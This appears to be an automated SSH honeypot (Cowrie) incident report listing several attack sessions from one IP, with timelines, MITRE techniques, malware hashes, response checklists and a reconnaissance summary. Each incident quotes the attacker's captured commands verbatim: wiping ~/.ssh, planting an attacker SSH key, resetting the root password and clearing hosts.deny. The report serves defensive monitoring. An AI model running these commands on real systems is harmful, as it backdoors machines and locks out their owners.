| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 09:05:27` | `cowrie.session.connect` |
| `2026-05-17 09:05:27` | `cowrie.client.version` |
| `2026-05-17 09:05:27` | `cowrie.client.kex` |
| `2026-05-17 09:05:28` | `cowrie.login.success` |
| `2026-05-17 09:05:28` | `cowrie.session.params` |
| `2026-05-17 09:05:28` | `cowrie.command.input` |
| `2026-05-17 09:05:28` | `cowrie.command.failed` |
| `2026-05-17 09:05:28` | `cowrie.log.closed` |
| `2026-05-17 09:05:29` | `cowrie.session.params` |
| `2026-05-17 09:05:29` | `cowrie.command.input` |
| `2026-05-17 09:05:29` | `cowrie.session.file_download` |
| `2026-05-17 09:05:29` | `cowrie.log.closed` |
| `2026-05-17 09:05:46` | `cowrie.session.params` |
| `2026-05-17 09:05:46` | `cowrie.command.input` |
| `2026-05-17 09:05:46` | `cowrie.log.closed` |
| `2026-05-17 09:05:47` | `cowrie.session.params` |
| `2026-05-17 09:05:47` | `cowrie.command.input` |
| `2026-05-17 09:05:47` | `cowrie.log.closed` |
| `2026-05-17 09:05:47` | `cowrie.session.params` |
| `2026-05-17 09:05:47` | `cowrie.command.input` |
| `2026-05-17 09:05:47` | `cowrie.session.file_download` |
| `2026-05-17 09:05:47` | `cowrie.log.closed` |
| `2026-05-17 09:05:48` | `cowrie.session.params` |
| `2026-05-17 09:05:48` | `cowrie.command.input` |
| `2026-05-17 09:05:48` | `cowrie.log.closed` |
| `2026-05-17 09:05:48` | `cowrie.session.params` |
| `2026-05-17 09:05:48` | `cowrie.command.input` |
| `2026-05-17 09:05:48` | `cowrie.log.closed` |
| `2026-05-17 09:05:49` | `cowrie.session.params` |
| `2026-05-17 09:05:49` | `cowrie.command.input` |
| `2026-05-17 09:05:49` | `cowrie.command.input` |
| `2026-05-17 09:05:49` | `cowrie.log.closed` |
| `2026-05-17 09:05:49` | `cowrie.session.params` |
| `2026-05-17 09:05:49` | `cowrie.command.input` |
| `2026-05-17 09:05:49` | `cowrie.log.closed` |
| `2026-05-17 09:05:50` | `cowrie.session.params` |
| `2026-05-17 09:05:50` | `cowrie.command.input` |
| `2026-05-17 09:05:50` | `cowrie.log.closed` |
| `2026-05-17 09:05:50` | `cowrie.session.params` |
| `2026-05-17 09:05:50` | `cowrie.command.input` |
| `2026-05-17 09:05:50` | `cowrie.log.closed` |
| `2026-05-17 09:05:51` | `cowrie.session.params` |
| `2026-05-17 09:05:51` | `cowrie.command.input` |
| `2026-05-17 09:05:51` | `cowrie.log.closed` |
| `2026-05-17 09:05:51` | `cowrie.session.params` |
| `2026-05-17 09:05:51` | `cowrie.command.input` |
| `2026-05-17 09:05:52` | `cowrie.log.closed` |
| `2026-05-17 09:05:52` | `cowrie.session.params` |
| `2026-05-17 09:05:52` | `cowrie.command.input` |
| `2026-05-17 09:05:52` | `cowrie.log.closed` |
| `2026-05-17 09:05:52` | `cowrie.session.params` |
| `2026-05-17 09:05:52` | `cowrie.command.input` |
| `2026-05-17 09:05:53` | `cowrie.log.closed` |
| `2026-05-17 09:05:53` | `cowrie.session.params` |
| `2026-05-17 09:05:53` | `cowrie.command.input` |
| `2026-05-17 09:05:53` | `cowrie.log.closed` |
| `2026-05-17 09:05:53` | `cowrie.session.params` |
| `2026-05-17 09:05:53` | `cowrie.command.input` |
| `2026-05-17 09:05:54` | `cowrie.log.closed` |
| `2026-05-17 09:05:54` | `cowrie.session.params` |
| `2026-05-17 09:05:54` | `cowrie.command.input` |
| `2026-05-17 09:05:54` | `cowrie.log.closed` |
| `2026-05-17 09:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.147[.]49` to AbuseIPDB if not already reported
- [ ] Block `118.122.147[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41e2af35613d

| Field | Detail |
|---|---|
| **Source IP** | `118.122.147[.]49` |
| **First Seen** | 2026-05-17 09:08 |
| **Last Seen** | 2026-05-17 09:08 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:2gBe1mXhik01"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 09:08:29` | `cowrie.session.connect` |
| `2026-05-17 09:08:29` | `cowrie.client.version` |
| `2026-05-17 09:08:29` | `cowrie.client.kex` |
| `2026-05-17 09:08:30` | `cowrie.login.success` |
| `2026-05-17 09:08:30` | `cowrie.session.params` |
| `2026-05-17 09:08:30` | `cowrie.command.input` |
| `2026-05-17 09:08:30` | `cowrie.command.failed` |
| `2026-05-17 09:08:31` | `cowrie.log.closed` |
| `2026-05-17 09:08:31` | `cowrie.session.params` |
| `2026-05-17 09:08:31` | `cowrie.command.input` |
| `2026-05-17 09:08:31` | `cowrie.session.file_download` |
| `2026-05-17 09:08:31` | `cowrie.log.closed` |
| `2026-05-17 09:08:42` | `cowrie.session.params` |
| `2026-05-17 09:08:42` | `cowrie.command.input` |
| `2026-05-17 09:08:42` | `cowrie.log.closed` |
| `2026-05-17 09:08:42` | `cowrie.session.params` |
| `2026-05-17 09:08:42` | `cowrie.command.input` |
| `2026-05-17 09:08:42` | `cowrie.log.closed` |
| `2026-05-17 09:08:43` | `cowrie.session.params` |
| `2026-05-17 09:08:43` | `cowrie.command.input` |
| `2026-05-17 09:08:43` | `cowrie.session.file_download` |
| `2026-05-17 09:08:43` | `cowrie.log.closed` |
| `2026-05-17 09:08:43` | `cowrie.session.params` |
| `2026-05-17 09:08:43` | `cowrie.command.input` |
| `2026-05-17 09:08:43` | `cowrie.log.closed` |
| `2026-05-17 09:08:44` | `cowrie.session.params` |
| `2026-05-17 09:08:44` | `cowrie.command.input` |
| `2026-05-17 09:08:44` | `cowrie.log.closed` |
| `2026-05-17 09:08:44` | `cowrie.session.params` |
| `2026-05-17 09:08:44` | `cowrie.command.input` |
| `2026-05-17 09:08:44` | `cowrie.command.input` |
| `2026-05-17 09:08:44` | `cowrie.log.closed` |
| `2026-05-17 09:08:45` | `cowrie.session.params` |
| `2026-05-17 09:08:45` | `cowrie.command.input` |
| `2026-05-17 09:08:45` | `cowrie.log.closed` |
| `2026-05-17 09:08:45` | `cowrie.session.params` |
| `2026-05-17 09:08:45` | `cowrie.command.input` |
| `2026-05-17 09:08:45` | `cowrie.log.closed` |
| `2026-05-17 09:08:46` | `cowrie.session.params` |
| `2026-05-17 09:08:46` | `cowrie.command.input` |
| `2026-05-17 09:08:46` | `cowrie.log.closed` |
| `2026-05-17 09:08:46` | `cowrie.session.params` |
| `2026-05-17 09:08:46` | `cowrie.command.input` |
| `2026-05-17 09:08:46` | `cowrie.log.closed` |
| `2026-05-17 09:08:47` | `cowrie.session.params` |
| `2026-05-17 09:08:47` | `cowrie.command.input` |
| `2026-05-17 09:08:47` | `cowrie.log.closed` |
| `2026-05-17 09:08:47` | `cowrie.session.params` |
| `2026-05-17 09:08:47` | `cowrie.command.input` |
| `2026-05-17 09:08:47` | `cowrie.log.closed` |
| `2026-05-17 09:08:48` | `cowrie.session.params` |
| `2026-05-17 09:08:48` | `cowrie.command.input` |
| `2026-05-17 09:08:48` | `cowrie.log.closed` |
| `2026-05-17 09:08:48` | `cowrie.session.params` |
| `2026-05-17 09:08:48` | `cowrie.command.input` |
| `2026-05-17 09:08:48` | `cowrie.log.closed` |
| `2026-05-17 09:08:49` | `cowrie.session.params` |
| `2026-05-17 09:08:49` | `cowrie.command.input` |
| `2026-05-17 09:08:49` | `cowrie.log.closed` |
| `2026-05-17 09:08:49` | `cowrie.session.params` |
| `2026-05-17 09:08:49` | `cowrie.command.input` |
| `2026-05-17 09:08:49` | `cowrie.log.closed` |
| `2026-05-17 09:08:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.147[.]49` to AbuseIPDB if not already reported
- [ ] Block `118.122.147[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac84a4573125

| Field | Detail |
|---|---|
| **Source IP** | `118.122.147[.]49` |
| **First Seen** | 2026-05-17 09:12 |
| **Last Seen** | 2026-05-17 09:13 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:MuhlbVQN4O6D"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 09:12:49` | `cowrie.session.connect` |
| `2026-05-17 09:12:49` | `cowrie.client.version` |
| `2026-05-17 09:12:49` | `cowrie.client.kex` |
| `2026-05-17 09:12:50` | `cowrie.login.success` |
| `2026-05-17 09:12:50` | `cowrie.session.params` |
| `2026-05-17 09:12:50` | `cowrie.command.input` |
| `2026-05-17 09:12:50` | `cowrie.command.failed` |
| `2026-05-17 09:12:51` | `cowrie.log.closed` |
| `2026-05-17 09:12:51` | `cowrie.session.params` |
| `2026-05-17 09:12:51` | `cowrie.command.input` |
| `2026-05-17 09:12:51` | `cowrie.session.file_download` |
| `2026-05-17 09:12:51` | `cowrie.log.closed` |
| `2026-05-17 09:13:08` | `cowrie.session.params` |
| `2026-05-17 09:13:08` | `cowrie.command.input` |
| `2026-05-17 09:13:09` | `cowrie.log.closed` |
| `2026-05-17 09:13:09` | `cowrie.session.params` |
| `2026-05-17 09:13:09` | `cowrie.command.input` |
| `2026-05-17 09:13:09` | `cowrie.log.closed` |
| `2026-05-17 09:13:09` | `cowrie.session.params` |
| `2026-05-17 09:13:09` | `cowrie.command.input` |
| `2026-05-17 09:13:09` | `cowrie.session.file_download` |
| `2026-05-17 09:13:09` | `cowrie.log.closed` |
| `2026-05-17 09:13:10` | `cowrie.session.params` |
| `2026-05-17 09:13:10` | `cowrie.command.input` |
| `2026-05-17 09:13:10` | `cowrie.log.closed` |
| `2026-05-17 09:13:10` | `cowrie.session.params` |
| `2026-05-17 09:13:10` | `cowrie.command.input` |
| `2026-05-17 09:13:10` | `cowrie.log.closed` |
| `2026-05-17 09:13:11` | `cowrie.session.params` |
| `2026-05-17 09:13:11` | `cowrie.command.input` |
| `2026-05-17 09:13:11` | `cowrie.command.input` |
| `2026-05-17 09:13:11` | `cowrie.log.closed` |
| `2026-05-17 09:13:11` | `cowrie.session.params` |
| `2026-05-17 09:13:11` | `cowrie.command.input` |
| `2026-05-17 09:13:11` | `cowrie.log.closed` |
| `2026-05-17 09:13:12` | `cowrie.session.params` |
| `2026-05-17 09:13:12` | `cowrie.command.input` |
| `2026-05-17 09:13:12` | `cowrie.log.closed` |
| `2026-05-17 09:13:12` | `cowrie.session.params` |
| `2026-05-17 09:13:12` | `cowrie.command.input` |
| `2026-05-17 09:13:12` | `cowrie.log.closed` |
| `2026-05-17 09:13:13` | `cowrie.session.params` |
| `2026-05-17 09:13:13` | `cowrie.command.input` |
| `2026-05-17 09:13:13` | `cowrie.log.closed` |
| `2026-05-17 09:13:13` | `cowrie.session.params` |
| `2026-05-17 09:13:13` | `cowrie.command.input` |
| `2026-05-17 09:13:13` | `cowrie.log.closed` |
| `2026-05-17 09:13:14` | `cowrie.session.params` |
| `2026-05-17 09:13:14` | `cowrie.command.input` |
| `2026-05-17 09:13:14` | `cowrie.log.closed` |
| `2026-05-17 09:13:14` | `cowrie.session.params` |
| `2026-05-17 09:13:14` | `cowrie.command.input` |
| `2026-05-17 09:13:14` | `cowrie.log.closed` |
| `2026-05-17 09:13:15` | `cowrie.session.params` |
| `2026-05-17 09:13:15` | `cowrie.command.input` |
| `2026-05-17 09:13:15` | `cowrie.log.closed` |
| `2026-05-17 09:13:15` | `cowrie.session.params` |
| `2026-05-17 09:13:15` | `cowrie.command.input` |
| `2026-05-17 09:13:15` | `cowrie.log.closed` |
| `2026-05-17 09:13:15` | `cowrie.session.params` |
| `2026-05-17 09:13:15` | `cowrie.command.input` |
| `2026-05-17 09:13:16` | `cowrie.log.closed` |
| `2026-05-17 09:13:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.147[.]49` to AbuseIPDB if not already reported
- [ ] Block `118.122.147[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f3c6e9dffec

| Field | Detail |
|---|---|
| **Source IP** | `118.122.147[.]49` |
| **First Seen** | 2026-05-17 09:15 |
| **Last Seen** | 2026-05-17 09:16 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:NNdHftUqCfXM"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 09:15:48` | `cowrie.session.connect` |
| `2026-05-17 09:15:48` | `cowrie.client.version` |
| `2026-05-17 09:15:48` | `cowrie.client.kex` |
| `2026-05-17 09:15:48` | `cowrie.login.success` |
| `2026-05-17 09:15:49` | `cowrie.session.params` |
| `2026-05-17 09:15:49` | `cowrie.command.input` |
| `2026-05-17 09:15:49` | `cowrie.command.failed` |
| `2026-05-17 09:15:49` | `cowrie.log.closed` |
| `2026-05-17 09:15:49` | `cowrie.session.params` |
| `2026-05-17 09:15:49` | `cowrie.command.input` |
| `2026-05-17 09:15:49` | `cowrie.session.file_download` |
| `2026-05-17 09:15:49` | `cowrie.log.closed` |
| `2026-05-17 09:16:00` | `cowrie.session.params` |
| `2026-05-17 09:16:00` | `cowrie.command.input` |
| `2026-05-17 09:16:00` | `cowrie.log.closed` |
| `2026-05-17 09:16:01` | `cowrie.session.params` |
| `2026-05-17 09:16:01` | `cowrie.command.input` |
| `2026-05-17 09:16:01` | `cowrie.log.closed` |
| `2026-05-17 09:16:01` | `cowrie.session.params` |
| `2026-05-17 09:16:01` | `cowrie.command.input` |
| `2026-05-17 09:16:01` | `cowrie.session.file_download` |
| `2026-05-17 09:16:01` | `cowrie.log.closed` |
| `2026-05-17 09:16:02` | `cowrie.session.params` |
| `2026-05-17 09:16:02` | `cowrie.command.input` |
| `2026-05-17 09:16:02` | `cowrie.log.closed` |
| `2026-05-17 09:16:02` | `cowrie.session.params` |
| `2026-05-17 09:16:02` | `cowrie.command.input` |
| `2026-05-17 09:16:02` | `cowrie.log.closed` |
| `2026-05-17 09:16:03` | `cowrie.session.params` |
| `2026-05-17 09:16:03` | `cowrie.command.input` |
| `2026-05-17 09:16:03` | `cowrie.command.input` |
| `2026-05-17 09:16:03` | `cowrie.log.closed` |
| `2026-05-17 09:16:03` | `cowrie.session.params` |
| `2026-05-17 09:16:03` | `cowrie.command.input` |
| `2026-05-17 09:16:03` | `cowrie.log.closed` |
| `2026-05-17 09:16:04` | `cowrie.session.params` |
| `2026-05-17 09:16:04` | `cowrie.command.input` |
| `2026-05-17 09:16:04` | `cowrie.log.closed` |
| `2026-05-17 09:16:04` | `cowrie.session.params` |
| `2026-05-17 09:16:04` | `cowrie.command.input` |
| `2026-05-17 09:16:05` | `cowrie.log.closed` |
| `2026-05-17 09:16:05` | `cowrie.session.params` |
| `2026-05-17 09:16:05` | `cowrie.command.input` |
| `2026-05-17 09:16:05` | `cowrie.log.closed` |
| `2026-05-17 09:16:05` | `cowrie.session.params` |
| `2026-05-17 09:16:05` | `cowrie.command.input` |
| `2026-05-17 09:16:06` | `cowrie.log.closed` |
| `2026-05-17 09:16:06` | `cowrie.session.params` |
| `2026-05-17 09:16:06` | `cowrie.command.input` |
| `2026-05-17 09:16:06` | `cowrie.log.closed` |
| `2026-05-17 09:16:06` | `cowrie.session.params` |
| `2026-05-17 09:16:06` | `cowrie.command.input` |
| `2026-05-17 09:16:07` | `cowrie.log.closed` |
| `2026-05-17 09:16:07` | `cowrie.session.params` |
| `2026-05-17 09:16:07` | `cowrie.command.input` |
| `2026-05-17 09:16:07` | `cowrie.log.closed` |
| `2026-05-17 09:16:07` | `cowrie.session.params` |
| `2026-05-17 09:16:07` | `cowrie.command.input` |
| `2026-05-17 09:16:08` | `cowrie.log.closed` |
| `2026-05-17 09:16:08` | `cowrie.session.params` |
| `2026-05-17 09:16:08` | `cowrie.command.input` |
| `2026-05-17 09:16:08` | `cowrie.log.closed` |
| `2026-05-17 09:16:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.147[.]49` to AbuseIPDB if not already reported
- [ ] Block `118.122.147[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5fa999b99e

| Field | Detail |
|---|---|
| **Source IP** | `118.122.147[.]49` |
| **First Seen** | 2026-05-17 09:19 |
| **Last Seen** | 2026-05-17 09:19 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:RAwm2crIeCsF"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-17 09:19:11` | `cowrie.session.connect` |
| `2026-05-17 09:19:11` | `cowrie.client.version` |
| `2026-05-17 09:19:11` | `cowrie.client.kex` |
| `2026-05-17 09:19:12` | `cowrie.login.success` |
| `2026-05-17 09:19:12` | `cowrie.session.params` |
| `2026-05-17 09:19:12` | `cowrie.command.input` |
| `2026-05-17 09:19:12` | `cowrie.command.failed` |
| `2026-05-17 09:19:12` | `cowrie.log.closed` |
| `2026-05-17 09:19:12` | `cowrie.session.params` |
| `2026-05-17 09:19:12` | `cowrie.command.input` |
| `2026-05-17 09:19:12` | `cowrie.session.file_download` |
| `2026-05-17 09:19:12` | `cowrie.log.closed` |
| `2026-05-17 09:19:29` | `cowrie.session.params` |
| `2026-05-17 09:19:29` | `cowrie.command.input` |
| `2026-05-17 09:19:30` | `cowrie.log.closed` |
| `2026-05-17 09:19:30` | `cowrie.session.params` |
| `2026-05-17 09:19:30` | `cowrie.command.input` |
| `2026-05-17 09:19:30` | `cowrie.log.closed` |
| `2026-05-17 09:19:30` | `cowrie.session.params` |
| `2026-05-17 09:19:30` | `cowrie.command.input` |
| `2026-05-17 09:19:30` | `cowrie.session.file_download` |
| `2026-05-17 09:19:30` | `cowrie.log.closed` |
| `2026-05-17 09:19:31` | `cowrie.session.params` |
| `2026-05-17 09:19:31` | `cowrie.command.input` |
| `2026-05-17 09:19:31` | `cowrie.log.closed` |
| `2026-05-17 09:19:31` | `cowrie.session.params` |
| `2026-05-17 09:19:31` | `cowrie.command.input` |
| `2026-05-17 09:19:32` | `cowrie.log.closed` |
| `2026-05-17 09:19:32` | `cowrie.session.params` |
| `2026-05-17 09:19:32` | `cowrie.command.input` |
| `2026-05-17 09:19:32` | `cowrie.command.input` |
| `2026-05-17 09:19:32` | `cowrie.log.closed` |
| `2026-05-17 09:19:32` | `cowrie.session.params` |
| `2026-05-17 09:19:32` | `cowrie.command.input` |
| `2026-05-17 09:19:33` | `cowrie.log.closed` |
| `2026-05-17 09:19:33` | `cowrie.session.params` |
| `2026-05-17 09:19:33` | `cowrie.command.input` |
| `2026-05-17 09:19:33` | `cowrie.log.closed` |
| `2026-05-17 09:19:33` | `cowrie.session.params` |
| `2026-05-17 09:19:33` | `cowrie.command.input` |
| `2026-05-17 09:19:34` | `cowrie.log.closed` |
| `2026-05-17 09:19:34` | `cowrie.session.params` |
| `2026-05-17 09:19:34` | `cowrie.command.input` |
| `2026-05-17 09:19:34` | `cowrie.log.closed` |
| `2026-05-17 09:19:34` | `cowrie.session.params` |
| `2026-05-17 09:19:34` | `cowrie.command.input` |
| `2026-05-17 09:19:35` | `cowrie.log.closed` |
| `2026-05-17 09:19:35` | `cowrie.session.params` |
| `2026-05-17 09:19:35` | `cowrie.command.input` |
| `2026-05-17 09:19:35` | `cowrie.log.closed` |
| `2026-05-17 09:19:35` | `cowrie.session.params` |
| `2026-05-17 09:19:35` | `cowrie.command.input` |
| `2026-05-17 09:19:36` | `cowrie.log.closed` |
| `2026-05-17 09:19:36` | `cowrie.session.params` |
| `2026-05-17 09:19:36` | `cowrie.command.input` |
| `2026-05-17 09:19:36` | `cowrie.log.closed` |
| `2026-05-17 09:19:36` | `cowrie.session.params` |
| `2026-05-17 09:19:36` | `cowrie.command.input` |
| `2026-05-17 09:19:37` | `cowrie.log.closed` |
| `2026-05-17 09:19:37` | `cowrie.session.params` |
| `2026-05-17 09:19:37` | `cowrie.command.input` |
| `2026-05-17 09:19:37` | `cowrie.log.closed` |
| `2026-05-17 09:19:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.122.147[.]49` to AbuseIPDB if not already reported
- [ ] Block `118.122.147[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.182.234[.]69` | **429** | 2026-05-17 06:48 | 2026-05-17 09:48 | 300m | 0 | `T1592` | 🟠 MEDIUM |
| `118.122.147[.]49` | **46** | 2026-05-17 08:43 | 2026-05-17 09:21 | 84m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `175.107.31[.]20` | **37** | 2026-05-17 06:53 | 2026-05-17 09:49 | 25m | 0 | `T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **33** | 2026-05-17 07:03 | 2026-05-17 09:48 | 45m | 0 | `T1592` | 🟠 MEDIUM |
| `218.78.46[.]81` | **18** | 2026-05-17 08:41 | 2026-05-17 09:01 | 34m | 1 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `208.109.244[.]195` | **17** | 2026-05-17 07:04 | 2026-05-17 09:19 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `101.96.202[.]48` | **11** | 2026-05-17 08:13 | 2026-05-17 08:31 | 18m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `137.184.204[.]8` | **9** | 2026-05-17 07:51 | 2026-05-17 09:46 | 12m | 0 | `T1592` | 🟢 LOW |
| `218.0.56[.]78` | **7** | 2026-05-17 07:27 | 2026-05-17 07:39 | 12m | 0 | `T1592` | 🟢 LOW |
| `101.47.16[.]134` | **2** | 2026-05-17 06:48 | 2026-05-17 06:48 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `58.20.236[.]52` | **2** | 2026-05-17 07:25 | 2026-05-17 07:27 | 4m | 0 | `T1592` | 🟢 LOW |
